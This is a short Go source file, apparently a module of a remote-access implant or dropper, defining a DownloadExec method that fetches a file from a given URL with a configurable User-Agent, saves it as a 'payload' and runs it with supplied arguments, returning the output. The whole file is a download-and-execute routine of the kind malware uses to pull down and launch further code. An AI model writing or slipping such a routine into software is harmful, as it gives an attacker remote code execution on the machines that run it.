package downloader

import (
	"io/ioutil"
	"net/http"

)

type HttpDownload struct {
	agent string
}

func (h *HttpDownload) DownloadExec(url string, args string) string{ 
	client := httpClient()
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return ""
	}

	req.Header.Set("User-Agent", h.agent)

	resp, err := client.Do(req)
	if err != nil {
		return ""
	}

	defer resp.Body.Close()
	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return ""
	}

	payload := save(data)
	output := run(payload, args)
	return output
}
